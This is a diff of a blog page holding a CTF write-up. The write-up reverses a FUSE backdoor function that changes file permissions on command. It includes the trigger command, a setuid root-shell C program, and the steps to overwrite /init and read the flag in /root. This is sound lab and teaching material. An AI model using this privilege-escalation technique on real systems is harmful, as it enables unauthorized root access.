@@ -15,6 +15,7 @@
 
     <!-- Theme CSS -->
     <link id="theme-style" rel="stylesheet" href="../../assets/css/style.css">
+    <link id="theme-style" rel="stylesheet" href="../../assets/css/prism.css">
 </head>
 <body class="theme-bg-light">
 
@@ -33,7 +34,7 @@
 
                 <div class="bio mb-3">Student<br>REV @ K3RN3L4RMY</div><!--//bio-->
                 <ul class="social-list list-inline py-3 mx-auto">
-                    <li class="list-inline-item"><a href="" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://twitter.com/Abraxus7331" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
                     <li class="list-inline-item"><a href="https://github.com/Kasimir123" target="_blank"><i class="fab fa-github-alt fa-fw"></i></a></li>
                     <li class="list-inline-item"><a href="https://www.linkedin.com/in/kasimir-schulz" target="_blank"><i class="fab fa-linkedin-in fa-fw"></i></a></li>
                 </ul><!--//social-list-->
@@ -72,59 +73,53 @@
 <h2 id="write-up">Write up:</h2>
 <p>This challenge had an nc connection with a proof of work check. Upon connecting to the system you saw that the backdoor file provided by the challenge was in /dev. The challenge has told us that the flag was in root but we did not have access to the directory.</p>
 <p>After downloading the file I tried running it but it crashed immediately. I then started reversing the file. After reversing for a bit I found the following function:</p>
-<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
-<span style="color:Blue;">unsigned</span> __int64 __fastcall backdoor_write(__int64 a1, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> *a2, size_t a3)
+<pre><code class="language-c">unsigned __int64 __fastcall backdoor_write(__int64 a1, const char *a2, size_t a3)
 {
-  <span style="color:Blue;">int</span> v3; <span style="color:Green;">// eax</span>
-  <span style="color:Blue;">char</span> *s; <span style="color:Green;">// [rsp+30h] [rbp-C0h]</span>
-  <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> *s1; <span style="color:Green;">// [rsp+38h] [rbp-B8h]</span>
-  <span style="color:Blue;">char</span> *file; <span style="color:Green;">// [rsp+40h] [rbp-B0h]</span>
-  <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> *nptr; <span style="color:Green;">// [rsp+48h] [rbp-A8h]</span>
-  <span style="color:Blue;">struct</span> stat64 v10; <span style="color:Green;">// [rsp+50h] [rbp-A0h] BYREF</span>
-  <span style="color:Blue;">unsigned</span> __int64 v11; <span style="color:Green;">// [rsp+E8h] [rbp-8h]</span>
+  int v3; // eax
+  char *s; // [rsp+30h] [rbp-C0h]
+  const char *s1; // [rsp+38h] [rbp-B8h]
+  char *file; // [rsp+40h] [rbp-B0h]
+  const char *nptr; // [rsp+48h] [rbp-A8h]
+  struct stat64 v10; // [rsp+50h] [rbp-A0h] BYREF
+  unsigned __int64 v11; // [rsp+E8h] [rbp-8h]
 
   v11 = __readfsqword(0x28u);
   s = strndup(a2, a3);
-  <span style="color:Blue;">if</span> ( s )
+  if ( s )
   {
-    s1 = strtok(s, <span style="color:#A31515;">&quot;:&quot;</span>);
-    file = strtok(0LL, <span style="color:#A31515;">&quot;:&quot;</span>);
-    nptr = strtok(0LL, <span style="color:#A31515;">&quot;:&quot;</span>);
-    <span style="color:Blue;">if</span> ( s1 &amp;&amp; file &amp;&amp; nptr &amp;&amp; !strncmp(s1, <span style="color:#A31515;">&quot;b4ckd00r&quot;</span>, 8uLL) )
+    s1 = strtok(s, ":");
+    file = strtok(0LL, ":");
+    nptr = strtok(0LL, ":");
+    if ( s1 && file && nptr && !strncmp(s1, "b4ckd00r", 8uLL) )
     {
-      stat64(file, &amp;v10);
-      <span style="color:Blue;">if</span> ( (v10.st_mode &amp; 0xF000) != 0x8000 || (v3 = atoi(nptr), chmod(file, v3)) )
+      stat64(file, &v10);
+      if ( (v10.st_mode & 0xF000) != 0x8000 || (v3 = atoi(nptr), chmod(file, v3)) )
         fuse_reply_err(a1, 22LL);
-      <span style="color:Blue;">else</span>
+      else
         fuse_reply_write(a1, a3);
     }
-    <span style="color:Blue;">else</span>
+    else
     {
       fuse_reply_err(a1, 22LL);
     }
     free(s);
   }
-  <span style="color:Blue;">else</span>
+  else
   {
     fuse_reply_err(a1, 22LL);
   }
-  <span style="color:Blue;">return</span> __readfsqword(0x28u) ^ v11;
-}
-</pre></div>
-</div>
+  return __readfsqword(0x28u) ^ v11;
+}</code></pre>
 <p>This seemed to compare some string to the format :b4ckd00r:file:value. File was then checked to see if it was a file with stat64, and was then passed the chmod, and the value was passed as the second parameter to chmod meaning it was the value for which permissions to set. After setting a value the program would call fuse error, if the write was not correct then the function would call the standard fuse write.</p>
 <p>After connecting to the server again I tested this by trying to change the permissions on /init. I did this by trying echo &quot;:b4ckd00r:/init:4095&quot; &gt; /dev/backdoor. with 4095 being full permissions. This ended up changing the permissions as expected. From here I needed to find a way to gain shell access. We then set up the following c program:</p>
-<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
+<pre><code class="language-c">#include <stdlib.h>
+#include <unistd.h>
 
-<span style="color:Blue;">int</span> main()
+int main()
 {
 	setuid(0);
-	system(<span style="color:#A31515;">&quot;/bin/sh&quot;</span>);
-}
-</pre></div>
-</div>
+	system("/bin/sh");
+}</code></pre>
 <p>Compiling this and setting it with full permissions worked on our system so we piped the input into base64 and copied it. Then we went onto the server and gave /init full permissions before piping the copied bytes into base64 decoder and into the /init file, overwriting it. After giving /init full permissions once again we were then able to run it and get a shell. From here we went into /root where there was a txt file with the flag.</p>
 
         </article>
@@ -139,5 +134,6 @@
     <!-- Javascript -->
     <script src="../../assets/js/popper.min.js"></script>
     <script src="../../assets/js/bootstrap.min.js"></script>
+    <script src="../../assets/js/prism.js"></script>
 </body>
 </html>
